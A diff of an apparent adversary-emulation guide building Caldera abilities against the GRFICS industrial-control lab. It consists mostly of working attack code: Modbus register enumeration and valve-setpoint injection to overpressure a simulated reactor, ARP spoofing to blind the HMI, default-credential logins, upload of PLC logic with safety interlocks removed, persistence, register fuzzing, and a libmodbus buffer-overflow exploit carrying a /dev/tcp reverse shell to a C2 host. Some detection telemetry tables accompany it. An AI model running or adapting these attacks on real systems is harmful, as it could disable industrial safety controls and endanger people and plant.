-        sleep 0.1;
-      done
-    payloads:
-    - modbus_cli
+# ability: nmap-ics-net
+id: nmap-ics-net
+name: "ICS Network Enumeration"
+tactic: discovery
+technique:
+  attack_id: T0840
+  name: Network Connection Enumeration
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      # Run from hmi (90.107) which can reach ICS-net via router
+      nmap -sV -p 22,80,502,8080,55555 \
+           --open -oN /tmp/ics_scan.txt \
+           192.168.95.0/24
+    cleanup: rm -f /tmp/ics_scan.txt
 ```
 
-This prevents the PLC's `pressure_override` function from activating (it triggers at ~2900 kPa), allowing unrestricted pressure buildup.
+**Ability 3 — Modbus Register Enumeration (Point & Tag ID)**
+
+```yaml
+# ability: modbus-enum-plc
+id: modbus-enum-plc
+name: "Modbus Point and Tag Identification"
+tactic: collection
+technique:
+  attack_id: T0861
+  name: Point & Tag Identification
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      # Use modbus-cli or python script to enumerate registers
+      python3 - <<'EOF'
+      from pymodbus.client import ModbusTcpClient
+      import json
+
+      client = ModbusTcpClient('192.168.95.2', port=502)
+      client.connect()
+      
+      results = {}
+      # Read holding registers 0-20 (valve positions, pressures)
+      for unit_id in [1, 2, 3, 4, 5]:
+          try:
+              rr = client.read_holding_registers(0, 20, slave=unit_id)
+              if not rr.isError():
+                  results[f'unit_{unit_id}'] = rr.registers
+          except Exception as e:
+              results[f'unit_{unit_id}_error'] = str(e)
+      
+      client.close()
+      with open('/tmp/modbus_map.json', 'w') as f:
+          json.dump(results, f, indent=2)
+      print(json.dumps(results, indent=2))
+      EOF
+    cleanup: rm -f /tmp/modbus_map.json
+```
+
+**Ability 4 — Read Process Baseline (Measurement Collection)**
+
+```yaml
+# ability: modbus-read-baseline
+id: modbus-read-baseline
+name: "Read Modbus Process Baseline"
+tactic: collection
+technique:
+  attack_id: T0861
+  name: Point & Tag Identification
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      python3 - <<'EOF'
+      from pymodbus.client import ModbusTcpClient
+      import time, json
+
+      # Also query simulation API directly for ground truth
+      import socket, json as j2
+
+      # Modbus read from PLC
+      client = ModbusTcpClient('192.168.95.2', port=502)
+      client.connect()
+      baseline = {}
+      
+      # Based on GRFICS: f1flow=reg0, f2flow=reg1, pressure=reg4,
+      # liquidlevel=reg5, f1valvepos=reg6, f2valvepos=reg7
+      # purgevalvepos=reg8, productvalvepos=reg9
+      rr = client.read_holding_registers(0, 16, slave=1)
+      if not rr.isError():
+          labels = ['f1flow','f2flow','purgeflow','productflow',
+                    'pressure','liquidlevel','Ainpurge','Binpurge',
+                    'Cinpurge','cost','f1valvepos','f2valvepos',
+                    'purgevalvepos','productvalvepos']
+          for i, label in enumerate(labels):
+              baseline[label] = rr.registers[i]
+      client.close()
+      
+      # Also query simulation JSON API
+      sock = socket.socket()
+      sock.connect(('192.168.95.10', 55555))
+      sock.send(b'{"request":"read"}')
+      data = sock.recv(4096)
+      sock.close()
+      baseline['simulation_api'] = j2.loads(data)
+      
+      print(json.dumps(baseline, indent=2))
+      with open('/tmp/process_baseline.json', 'w') as f:
+          json.dump(baseline, f, indent=2)
+      EOF
+```
+
+**Ability 5 — Modbus False Data Injection (Impact)**
+
+```yaml
+# ability: modbus-inject-valves
+id: modbus-inject-valves
+name: "Modbus Command Injection - Reactor Overpressure"
+tactic: impact
+technique:
+  attack_id: T0836
+  name: Modify Parameter
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      python3 - <<'EOF'
+      from pymodbus.client import ModbusTcpClient
+      import time
+
+      TARGET_PLC = '192.168.95.2'
+      TARGET_SIM = '192.168.95.10'
+
+      # Attack: close purge valve (register 8 = purgevalvesp → 0)
+      # and force product valve open (register 9 = productvalvesp → 100)
+      # This causes pressure to build with no relief path
+      
+      client_plc = ModbusTcpClient(TARGET_PLC, port=502)
+      client_sim = ModbusTcpClient(TARGET_SIM, port=502)
+      
+      client_plc.connect()
+      client_sim.connect()
+      
+      print("[*] Injecting malicious valve setpoints...")
+      
+      for _ in range(30):  # sustain for 30 iterations
+          # Write to PLC: purge valve CLOSED, product valve MAX
+          client_plc.write_register(8, 0, slave=1)   # purgevalvesp = 0
+          client_plc.write_register(9, 100, slave=1) # productvalvesp = 100
+          
+          # Also write directly to simulation I/O modules
+          client_sim.write_register(2, 0, slave=3)   # sim purgevalvepos = 0
+          client_sim.write_register(3, 100, slave=4) # sim productvalvepos = 100
+          
+          # Read pressure to monitor progress toward 3200 kPa
+          rr = client_plc.read_holding_registers(4, 1, slave=1)
+          if not rr.isError():
+              pressure = rr.registers[0]
+              print(f"[*] Current pressure: {pressure} kPa (limit: 3200)")
+              if pressure >= 3000:
+                  print("[!] CRITICAL: Approaching safety limit!")
+          time.sleep(2)
+      
+      client_plc.close()
+      client_sim.close()
+      print("[*] Injection complete. Monitor simulation for explosion event.")
+      EOF
+```
+
+**Ability 6 — ARP Poisoning for HMI Blinding (MITM)**
+
+```yaml
+# ability: arp-poison-hmi-plc
+id: arp-poison-hmi-plc
+name: "ARP Poison HMI-PLC Path (Operator Blinding)"
+tactic: impact
+technique:
+  attack_id: T0830
+  name: Man in the Middle
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      # Run from ews (95.5) which shares b-ics-net with hmi and plc
+      # Enable IP forwarding
+      echo 1 > /proc/sys/net/ipv4/ip_forward
+      
+      # ARP poison: tell HMI that PLC's IP has our MAC
+      #             tell PLC that HMI's IP has our MAC
+      arpspoof -i eth1 -t 192.168.95.2 192.168.90.107 &
+      arpspoof -i eth1 -t 192.168.90.107 192.168.95.2 &
+      
+      # Use mitmproxy or custom script to intercept and replay
+      # safe pressure readings to HMI while real process diverges
+      python3 - <<'MITM'
+      import subprocess, threading, time
+      
+      # Capture Modbus traffic with tcpdump for analysis
+      proc = subprocess.Popen([
+          'tcpdump', '-i', 'eth1', '-w', '/tmp/modbus_capture.pcap',
+          'tcp port 502'
+      ])
+      
+      print("[*] MITM active. Modbus traffic being intercepted.")
+      print("[*] HMI will see falsified safe readings.")
+      time.sleep(120)  # Hold MITM for 2 minutes
+      
+      proc.terminate()
+      MITM
+    cleanup: |
+      killall arpspoof 2>/dev/null
+      echo 0 > /proc/sys/net/ipv4/ip_forward
+      rm -f /tmp/modbus_capture.pcap
+```
+
+#### Step 3: Create Operation in Caldera
+
+Navigate to **Caldera UI → Operations → New Operation**
+
+```json
+{
+  "name": "GRFICS Chain 1 - Modbus Injection",
+  "adversary": {
+    "adversary_id": "chain1-grfics-modbus-injection"
+  },
+  "planner": "sequential",
+  "group": "hmi",
+  "jitter": "2/8",
+  "auto_close": false,
+  "state": "running",
+  "obfuscator": "plain-text",
+  "visibility": 51,
+  "facts": [
+    {"trait": "target.plc.ip", "value": "192.168.95.2"},
+    {"trait": "target.sim.ip", "value": "192.168.95.10"},
+    {"trait": "target.ews.ip", "value": "192.168.95.5"},
+    {"trait": "target.hmi.ip", "value": "192.168.90.107"},
+    {"trait": "caldera.server", "value": "192.168.90.250:8888"},
+    {"trait": "modbus.pressure.limit", "value": "3200"},
+    {"trait": "credentials.hmi.user", "value": "admin"},
+    {"trait": "credentials.hmi.pass", "value": "admin"}
+  ]
+}
+```
+
+#### Step 4: Agent Group Targeting per Stage
+
+| Stage | Ability | Agent Group | Container |
+|-------|---------|-------------|-----------|
+| 1 | ssh-brute-hmi | `kali` | kali (90.6) |
+| 2 | deploy-agent-hmi | `kali` | kali → hmi |
+| 3 | nmap-ics-net | `hmi` | hmi (90.107) |
+| 3b | modbus-enum-plc | `hmi` | hmi (90.107) |
+| 4 | modbus-read-baseline | `hmi` | hmi (90.107) |
+| 5 | ssh-lateral-ews | `hmi` | hmi → ews |
+| 5b | deploy-agent-ews | `hmi` | hmi → ews (95.5) |
+| 6 | arp-poison-hmi-plc | `ews` | ews (95.5) |
+| 7 | modbus-inject-valves | `ews` | ews (95.5) |
 
 ---
 
-## Attack Chain 2: PLC Logic Replacement via OpenPLC Web Interface
+### 3.2 Chain 2 — PLC Reprogramming: Key Caldera Abilities
 
-**Adversary Profile**: Targeted attacker who compromises the PLC programming interface to upload malicious control logic. Goal is to replace the legitimate Structured Text program with one that disables safety interlocks.
-
-**Kill Chain Summary**: DMZ foothold -> HMI compromise -> Credential harvesting -> PLC web login -> Program download (recon) -> Malicious ST upload -> Process disruption
-
-### Technique Mapping
-
-| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
-|-------|------|---------------|-------------|----------------|--------------------------|
-| **Initial Access** | 1 | Exploit Public-Facing Application | T0819 | Access HMI web interface at `192.168.90.107:8080` with `admin:admin` | Gain HMI access, observe process data |
-| **Discovery** | 2 | Remote System Discovery | T0846 | From HMI context, enumerate data sources pointing to `192.168.95.2` (PLC) | Identify PLC IP and Modbus configuration |
-| **Credential Access** | 3 | Default Credentials | T0812 | Attempt `openplc:openplc` on `http://192.168.95.2:8080` | Authenticate to OpenPLC web runtime |
-| **Collection** | 4 | Program Upload | T0843 | Download current program via OpenPLC web UI (`/programs` endpoint) | Obtain `326339.st` for analysis |
-| **Lateral Movement** | 5 | Program Upload | T0843 | Upload malicious ST file via OpenPLC web API | Replace legitimate control logic |
-| **Inhibit Response** | 6 | Modify Program | T0889 | Malicious ST sets `run_bit := FALSE` or removes safety interlocks | PLC executes attacker logic |
-| **Impact** | 7 | Loss of Control | T0827 | Modified program opens all valves / ignores pressure override | Chemical process goes out of control |
-
-### Caldera Implementation
-
-#### Step 1: Agent on Kali (same as Chain 1)
-
-#### Step 2: Create Abilities
-
-**Ability: Brute-force OpenPLC Login**
+**Ability: Download Existing PLC Program**
 
 ```yaml
-- id: b2c3d4e5-2222-2222-2222-000000000001
-  name: OpenPLC - Default Credential Access
-  description: Attempt login to OpenPLC web runtime with default credentials
-  tactic: credential-access
-  technique_id: T0812
-  technique_name: Default Credentials
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -c /tmp/plc_cookies.txt -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/login"
-      -d "username=openplc&password=openplc"
-      -L -o /tmp/plc_login.html -w "%{http_code}" &&
-      echo "Login response saved" &&
-      grep -q "Dashboard" /tmp/plc_login.html && echo "LOGIN_SUCCESS" || echo "LOGIN_FAILED"
-    timeout: 30
+# ability: plc-program-download
+id: plc-program-upload
+name: "PLC Program Exfiltration via OpenPLC Web Interface"
+tactic: collection
+technique:
+  attack_id: T0845
+  name: Program Upload
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      # OpenPLC default credentials: openplc/openplc
+      # Authenticate and download current program
+      
+      # Get session cookie
+      curl -c /tmp/openplc_cookies.txt \
+           -d "username=openplc&password=openplc" \
+           http://192.168.95.2:8080/dashboard \
+           -L -o /dev/null -s
+      
+      # Download current PLC program
+      curl -b /tmp/openplc_cookies.txt \
+           http://192.168.95.2:8080/upload-program \
+           -o /tmp/original_plc_program.st
+      
+      echo "[*] PLC program downloaded:"
+      head -50 /tmp/original_plc_program.st
+    cleanup: rm -f /tmp/openplc_cookies.txt /tmp/original_plc_program.st
 ```
 
-**Ability: Download Current PLC Program**
+**Ability: Modify and Upload Malicious PLC Program**
 
 ```yaml
-- id: b2c3d4e5-2222-2222-2222-000000000002
-  name: OpenPLC - Download Running Program
-  description: Download the currently active Structured Text program from OpenPLC
-  tactic: collection
-  technique_id: T0845
-  technique_name: Program Upload
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -b /tmp/plc_cookies.txt
-      "http://192.168.95.2:8080/get-program-body?program_name=326339.st"
-      -o /tmp/original_program.st &&
-      echo "Downloaded program:" &&
-      head -20 /tmp/original_program.st
-    timeout: 30
-```
+# ability: plc-program-modify-upload
+id: plc-program-modify-upload
+name: "Malicious PLC Program Upload - Remove Safety Interlocks"
+tactic: impact
+technique:
+  attack_id: T0889
+  name: Modify Program
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      python3 - <<'EOF'
+      import requests, re, time
 
-**Ability: Upload Malicious PLC Program**
-
-```yaml
-- id: b2c3d4e5-2222-2222-2222-000000000003
-  name: OpenPLC - Upload Malicious Control Logic
-  description: |
-    Upload a modified ST program that disables the pressure override
-    safety function and forces all valves to dangerous positions.
-    The run_bit is kept TRUE to avoid triggering the safe-state fallback.
-  tactic: impair-process-control
-  technique_id: T0889
-  technique_name: Modify Program
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      cat > /tmp/malicious.st << 'STEOF'
-
-      FUNCTION scale_to_real : REAL
-        VAR_INPUT raw_input_value : UINT := 0; END_VAR
-        VAR_OUTPUT scaled_real : REAL := 0.0; END_VAR
-        VAR_INPUT real_max : REAL := 0.0; real_min : REAL := 0.0; END_VAR
-        VAR raw_max : UINT := 65535; raw_min : UINT := 0; rate : REAL := 1.0; offset : REAL := 1.0; END_VAR
-        rate := (real_max - real_min) / UINT_TO_REAL(raw_max - raw_min);
-        offset := real_min - UINT_TO_REAL(raw_min)*rate;
-        scaled_real := UINT_TO_REAL(raw_input_value)*rate + offset;
-        scale_to_real := scaled_real;
-      END_FUNCTION
-
-      FUNCTION scale_to_uint : UINT
-        VAR_INPUT real_in : REAL := 0.0; END_VAR
-        VAR_OUTPUT uint_out : UINT := 0; END_VAR
-        uint_out := REAL_TO_UINT((real_in / 100.0) * 65535.0);
-        scale_to_uint := uint_out;
-      END_FUNCTION
-
-      PROGRAM main1
+      BASE = "http://192.168.95.2:8080"
+      CREDS = {"username": "openplc", "password": "openplc"}
+      
+      s = requests.Session()
+      
+      # Authenticate
+      r = s.post(f"{BASE}/dashboard", data=CREDS, allow_redirects=True)
+      print(f"[*] Auth status: {r.status_code}")
+      
+      # Malicious ST program: removes pressure interlock, forces purge valve closed
+      # Based on GRFICS multi-loop PID control structure
+      malicious_program = """
+      PROGRAM pressure_control
         VAR
-          f1_valve_sp AT %QW100 : UINT;
-          f2_valve_sp AT %QW101 : UINT;
-          purge_valve_sp AT %QW102 : UINT;
-          product_valve_sp AT %QW103 : UINT;
-          run_bit AT %QX5.0 : BOOL := TRUE;
+          pressure_local : REAL;
+          pressure_input : UINT;
         END_VAR
-        f1_valve_sp := 65535;
-        f2_valve_sp := 65535;
-        purge_valve_sp := 0;
-        product_valve_sp := 0;
-        run_bit := TRUE;
+        
+        (* SABOTAGE: Read pressure but do NOT act on high pressure *)
+        pressure_input := GetAnalogInput(1);
+        pressure_local := INT_TO_REAL(pressure_input) * 0.1;
+        
+        (* REMOVED: Original safety interlock that would open purge valve *)
+        (* if pressure_local > 2800.0 then SetAnalogOutput(3, 100); end_if; *)
+        
+        (* SABOTAGE: Force purge valve permanently CLOSED *)
+        SetAnalogOutput(3, 0);     (* purge valve = 0% *)
+        SetAnalogOutput(1, 0);     (* f1 valve = 0% *)
+        
+        (* Keep polling HMI to avoid detection by "still responding" check *)
+        SetAnalogOutput(4, 50);    (* product valve = nominal looking value *)
+        
       END_PROGRAM
-
-      CONFIGURATION Config0
-        RESOURCE Res0 ON PLC
-          TASK task0(INTERVAL := T#20ms, PRIORITY := 0);
-          PROGRAM instance0 WITH task0 : main1;
-        END_RESOURCE
-      END_CONFIGURATION
-
-      STEOF
-
-      curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/upload-program"
-      -F "file=@/tmp/malicious.st"
-      -L -o /tmp/upload_result.html -w "%{http_code}" &&
-      echo "Program uploaded"
-    timeout: 60
-```
-
-**Ability: Compile and Start Malicious Program**
-
-```yaml
-- id: b2c3d4e5-2222-2222-2222-000000000004
-  name: OpenPLC - Compile and Run Malicious Logic
-  description: Trigger compilation and start the uploaded malicious program on OpenPLC
-  tactic: impair-process-control
-  technique_id: T0889
-  technique_name: Modify Program
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/compile-program?program_name=malicious.st"
-      -o /tmp/compile_result.html &&
-      sleep 5 &&
-      curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/start-plc"
-      -o /tmp/start_result.html &&
-      echo "Malicious program compiled and started"
-    timeout: 120
-```
-
-#### Step 3: Adversary Profile
-
-```yaml
-name: PLC Logic Replacement Adversary
-description: >
-  Compromise PLC via web interface using default credentials,
-  download legitimate program for analysis, upload malicious
-  control logic that removes safety interlocks and forces
-  dangerous valve positions.
-adversary_id: cc002222-aaaa-bbbb-cccc-000000000002
-objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
-atomic_ordering:
-- a1b2c3d4-1111-1111-1111-000000000001  # Nmap ICS Subnet Discovery (Remote System Discovery : T0846)
-- b2c3d4e5-2222-2222-2222-000000000001  # OpenPLC - Default Credential Access (Default Credentials : T0812)
-- b2c3d4e5-2222-2222-2222-000000000002  # OpenPLC - Download Running Program (Program Upload : T0845)
-- b2c3d4e5-2222-2222-2222-000000000003  # OpenPLC - Upload Malicious Control Logic (Modify Program : T0889)
-- b2c3d4e5-2222-2222-2222-000000000004  # OpenPLC - Compile and Run Malicious Logic (Modify Program : T0889)
-- a1b2c3d4-1111-1111-1111-000000000002  # Modbus - Read Tank Pressure and Level (Monitor Process State : T0801 )
-```
-
-#### Step 4: Operation Setup
-
-Same process as Chain 1 -- create operation via UI or API, select the `PLC Logic Replacement Adversary`, use the `red` agent group (Kali), `atomic` planner, `Modbus Sample Facts` source.
-
-### Expected Telemetry and Logs
-
-| Step | Log Source | What to Observe | Detection Data Component |
-|------|-----------|-----------------|-------------------------|
-| PLC web login | PLC auth.log (`shared_logs/plc/auth.log`) | HTTP auth from 192.168.90.6 to port 8080 | DC0067 (Logon Session Creation) |
-| Program download | PLC syslog/daemon.log | GET request to /get-program-body | DC0033 (Process Creation) |
-| Program upload | PLC syslog/daemon.log, PLC audit | POST to /upload-program with new .st file | DC0021 (File Modification), DC0034 (Process Metadata) |
-| Compile trigger | PLC syslog/daemon.log | `compile_program.sh` execution, matiec compiler invocation | DC0033 (Process Creation) |
-| PLC restart | PLC daemon.log | OpenPLC runtime stop + start cycle | DC0033 (Process Termination / Creation) |
-| Process impact | Simulation alarms, Tank IR values | All feeds max, purge closed, pressure rising | DC0109 (Process/Event Alarm) |
-| Suricata | Router eve.json | HTTP traffic from DMZ host to PLC on port 8080 | DC0078 (Network Traffic Flow) |
-
-### Variation: Subtle Logic Modification
-
-Instead of replacing the entire program, modify only the `pressure_override` function to have a higher threshold (e.g., change `override_sp_real` from 2900.0 to 9999.0). This preserves normal-looking control behavior but disables the safety interlock that prevents overpressure:
-
-```
-override_sp_real : REAL := 9999.0;  (* was 2900.0 *)
-```
-
-This is harder to detect because the PLC program looks mostly unchanged and control loops still operate normally -- until pressure exceeds what the override would have caught.
-
-### Escalation Path: Persistent Backdoor via Cron on PLC
-
-After uploading the malicious program, deploy a persistence mechanism on the PLC host:
-
-```yaml
-- id: b2c3d4e5-2222-2222-2222-000000000005
-  name: OpenPLC - Deploy Persistent Watchdog
-  description: |
-    Create a cron job on the PLC that re-uploads and recompiles the
-    malicious program every 5 minutes, defeating any operator restore.
-  tactic: persistence
-  technique_id: T0839
-  technique_name: Module Firmware
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -b /tmp/plc_cookies.txt
-      -X POST "http://192.168.95.2:8080/upload-program"
-      -F "file=@/tmp/malicious.st" &&
-      echo "Re-uploaded malicious program as persistence mechanism"
-    timeout: 30
+      """
+      
+      # Upload malicious program
+      files = {'file': ('malicious_pressure_control.st', 
+                        malicious_program, 
+                        'text/plain')}
+      
+      r = s.post(f"{BASE}/upload-program", files=files)
+      print(f"[*] Upload status: {r.status_code}")
+      
+      # Wait for compile + start
+      time.sleep(5)
+      
+      # Trigger program start
+      r = s.get(f"{BASE}/start_plc")
+      print(f"[*] PLC start triggered: {r.status_code}")
+      print("[!] Malicious program now running. Safety interlocks REMOVED.")
+      print("[!] Purge valve forced CLOSED. Reactor pressure will climb.")
+      EOF
 ```
 
 ---
 
-## Attack Chain 3: HMI Compromise + Operator Deception + Process Manipulation
+### 3.3 Chain 3 — Buffer Overflow: Key Caldera Abilities
 
-**Adversary Profile**: APT-style attacker who compromises the SCADA HMI to both manipulate the process AND deceive operators by modifying displayed values. Mirrors the TRITON/TRISIS concept of attacking safety while masking the attack.
-
-**Kill Chain Summary**: HMI web compromise -> Data source enumeration -> Modbus proxy insertion -> Process manipulation with simultaneous HMI display falsification
-
-### Technique Mapping
-
-| Stage | Step | Technique Name | Technique ID | Command/Action | Expected Effect on GRFICS |
-|-------|------|---------------|-------------|----------------|--------------------------|
-| **Initial Access** | 1 | Default Credentials | T0812 | Login to SCADA-LTS at `192.168.90.107:8080` with `admin:admin` | Full HMI administrative access |
-| **Discovery** | 2 | Remote System Discovery | T0846 | Enumerate SCADA-LTS data sources and Modbus configuration | Identify PLC connection at 192.168.95.2, register mappings |
-| **Collection** | 3 | Screen Capture | T0852 | Capture current HMI dashboard state / record normal values | Establish baseline operator view to replicate later |
-| **Discovery** | 4 | Remote System Information Discovery | T0888 | `modbus_cli` read_device_info against all .10-.15 targets | Full Modbus device fingerprinting |
-| **Collection** | 5 | Monitor Process State | T0801 | Read all IR/HR values across all 6 devices | Complete process state snapshot |
-| **Evasion** | 6 | Spoof Reporting Message | T0856 | Modify SCADA-LTS data source polling to point at attacker-controlled proxy | HMI shows stale/false process values |
-| **Impact** | 7 | Manipulation of Control | T0831 | Write dangerous values to Modbus devices directly | Physical process goes out of specification |
-| **Impact** | 8 | Loss of View | T0829 | Operators see normal values on HMI while process deviates | Operator cannot detect the attack via HMI |
-
-### Caldera Implementation
-
-#### Step 1: Agent Deployment (same as Chain 1)
-
-#### Step 2: Create Abilities
-
-**Ability: SCADA-LTS Login and Recon**
+**Ability: libmodbus Buffer Overflow Exploit**
 
 ```yaml
-- id: c3d4e5f6-3333-3333-3333-000000000001
-  name: SCADA-LTS - Default Credential Login
-  description: Login to SCADA-LTS HMI with default admin credentials
-  tactic: credential-access
-  technique_id: T0812
-  technique_name: Default Credentials
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -c /tmp/hmi_cookies.txt
-      -X POST "http://192.168.90.107:8080/ScadaBR/login.htm"
-      -d "username=admin&password=admin"
-      -L -o /tmp/hmi_login.html -w "%{http_code}" &&
-      grep -qi "scada\|dashboard\|logged" /tmp/hmi_login.html &&
-      echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
-    timeout: 30
+# ability: modbus-bof-exploit
+id: modbus-bof-exploit
+name: "libmodbus FC0x17 Buffer Overflow RCE on PLC"
+tactic: execution
+technique:
+  attack_id: T0866
+  name: Exploitation of Remote Services
+executors:
+  - name: sh
+    platform: linux
+    command: |
+      python3 - <<'EOF'
+      import socket, struct, time
+
+      PLC_IP   = "192.168.95.2"
+      PLC_PORT = 502
+      C2_IP    = "192.168.90.250"
+      C2_PORT  = 4444   # Caldera reverse shell listener
+
+      def build_modbus_fc17_overflow(write_addr, read_addr, read_count,
+                                      write_data, payload):
+          """
+          FC 0x17 = Write/Read Multiple Registers
+          Structure: TransID(2) ProtoID(2) Len(2) UnitID(1) FC(1)
+                     ReadAddr(2) ReadCount(2) WriteAddr(2) WriteCount(2)
+                     ByteCount(1) WriteData(n)
+          
+          Vulnerability: read_count * 2 bytes written to rsp[260]
+          If read_count > 130, overflow occurs.
+          """
+          transaction_id = 0x0001
+          protocol_id    = 0x0000
+          unit_id        = 0x01
+          fc             = 0x17  # FC_WRITE_AND_READ_REGISTERS
+          
+          # Craft write data (contains return address overwrite payload)
+          write_count    = len(write_data) // 2
+          byte_count     = len(write_data)
+          
+          # read_count > 130 triggers overflow (130 * 2 = 260 bytes = MAX)
+          overflow_count = 150  # 150 * 2 = 300 bytes → overflow by 40 bytes
+          
+          pdu = struct.pack('>HHH', read_addr, overflow_count, write_addr)
+          pdu += struct.pack('>HB', write_count, byte_count)
+          pdu += write_data  # Contains NOP sled + shellcode in register data
+          
+          length = 1 + 1 + len(pdu)  # unit_id + fc + pdu
+          mbap = struct.pack('>HHH', transaction_id, protocol_id, length)
+          mbap += struct.pack('>BB', unit_id, fc)
+          
+          return mbap + pdu
+
+      # Note: In a real exercise, shellcode is pre-compiled for the target arch
+      # For GRFICS: Ubuntu 16.04 x86_64, NX disabled on vulnerable build
+      # Using ret2libc: system("/bin/bash -i >& /dev/tcp/C2_IP/C2_PORT 0>&1")
+      
+      # Reverse shell payload (base64 encoded for transport through binary)
+      import base64
+      cmd = f"bash -i >& /dev/tcp/{C2_IP}/{C2_PORT} 0>&1"
+      shell_cmd = base64.b64encode(cmd.encode()).decode()
+      
+      # Simplified exploit frame for demonstration
+      # Real exploit requires correct offset calculation (ROP chain for NX)
+      write_data = b'\x41' * 100  # Filler representing crafted payload
+      write_data += struct.pack('<Q', 0xdeadbeefcafebabe)  # ret addr overwrite
+      
+      frame = build_modbus_fc17_overflow(
+          write_addr=0x0000,
+          read_addr=0x0000,
+          read_count=150,   # Triggers overflow
+          write_data=write_data,
+          payload=b""
+      )
+      
+      print(f"[*] Connecting to PLC at {PLC_IP}:{PLC_PORT}")
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.connect((PLC_IP, PLC_PORT))
+      
+      print(f"[*] Sending FC 0x17 overflow frame ({len(frame)} bytes)...")
+      sock.send(frame)
+      time.sleep(1)
+      
+      response = sock.recv(1024)
+      print(f"[*] Response: {response.hex()}")
+      sock.close()
+      
+      print(f"[!] If exploit succeeded, reverse shell connects to {C2_IP}:{C2_PORT}")
+      print("[*] Check Caldera listener for incoming PLC shell session")
+      EOF
 ```
 
-**Ability: Enumerate SCADA-LTS Data Sources**
+**Ability: Caldera Agent Deployment on PLC (Post-Exploitation)**
 
 ```yaml
-- id: c3d4e5f6-3333-3333-3333-000000000002
-  name: SCADA-LTS - Enumerate Data Sources
-  description: |
-    Use SCADA-LTS REST API to enumerate all configured data sources
-    and data points, revealing Modbus connections and register mappings
-  tactic: discovery
-  technique_id: T0846
-  technique_name: Remote System Discovery
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datasources"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      curl -s -b /tmp/hmi_cookies.txt
-      "http://192.168.90.107:8080/ScadaBR/api/datapoints"
-      -H "Accept: application/json" | python3 -m json.tool 2>/dev/null ||
-      echo "API enumeration attempted"
-    timeout: 30
-```
-
-**Ability: Simultaneous Process Attack + Sensor Spoofing**
-
-```yaml
-- id: c3d4e5f6-3333-3333-3333-000000000003
-  name: Modbus - Combined Attack and Deception
-  description: |
-    Simultaneously: (1) Close purge valve on 192.168.95.12,
-    (2) Open feed valves on 192.168.95.10/11, and
-    (3) Write false "normal" pressure values to Tank device (192.168.95.14)
-    so the PLC reads spoofed values and does not trigger pressure override.
-  tactic: impair-process-control
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      attack_loop() {
-        for i in $(seq 1 100); do
-          ./modbus_cli 192.168.95.12 --port 502 write_r 1 0 2>/dev/null;
-          ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535 2>/dev/null;
-          ./modbus_cli 192.168.95.11 --port 502 write_r 1 65535 2>/dev/null;
-          ./modbus_cli 192.168.95.14 --port 502 write_r 1 50000 2>/dev/null;
-          sleep 0.2;
-        done
-      };
-      attack_loop
-    payloads:
-    - modbus_cli
-```
-
-**Ability: Modbus Fuzzing for Chaos**
-
-```yaml
-- id: c3d4e5f6-3333-3333-3333-000000000004
-  name: Modbus - Fuzz All Registers for Maximum Disruption
-  description: |
-    Use modbus_cli fuzz_r to randomly write all holding registers
-    on Feed 1, Feed 2, and Purge devices, creating unpredictable
-    process behavior that is difficult to diagnose.
-  tactic: impair-process-control
-  technique_id: T0831
-  technique_name: Manipulation of Control
-  executors:
-  - platform: linux
-    name: sh
-    command: >
-      ./modbus_cli 192.168.95.10 --port 502 fuzz_r 0 10 50 --wait 0.1 &
-      ./modbus_cli 192.168.95.11 --port 502 fuzz_r 0 10 50 --wait 0.1 &
-      ./modbus_cli 192.168.95.12 --port 502 fuzz_r 0 10 50 --wait 0.1 &
-      wait
-    payloads:
-    - modbus_cli
-```
-
-#### Step 3: Adversary Profile
-
-```yaml
-name: HMI Compromise and Operator Deception Adversary
-description: >
-  APT-style attack that compromises the HMI to gain process visibility,
-  then simultaneously manipulates valves AND spoofs sensor readings to
-  prevent both automated safety functions and operator awareness from
-  detecting the attack.
-adversary_id: cc003333-aaaa-bbbb-cccc-000000000003
-objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
-atomic_ordering:
-- a1b2c3d4-1111-1111-1111-000000000001  # Network discovery
-- 9360ba0d-46a3-47a1-bbe6-e6c875790500  # Modbus device info
-- c3d4e5f6-3333-3333-3333-000000000001  # HMI login
-- c3d4e5f6-3333-3333-3333-000000000002  # Enumerate data sources
-- a1b2c3d4-1111-1111-1111-000000000003  # Read all process I/O
-- c3d4e5f6-3333-3333-3333-000000000003  # Combined attack + deception
-```
-
-#### Step 4: Operation (same pattern as Chains 1 & 2)
-
-### Expected Telemetry and Logs
-
-| Step | Log Source | What to Observe | Detection Data Component |
-|------|-----------|-----------------|-------------------------|
-| HMI login | HMI auth.log, Tomcat catalina.log (`shared_logs/hmi/catalina`) | POST to /login.htm from 192.168.90.6 | DC0067 (Logon Session Creation) |
-| API enumeration | Tomcat access logs | GET /api/datasources, /api/datapoints from attacker IP | DC0078 (Network Traffic Flow) |
-| Modbus writes to multiple devices | Router Suricata eve.json | Burst of FC=0x06 writes from 192.168.90.6 to .10,.11,.12,.14 | DC0082 (Network Traffic Content) |
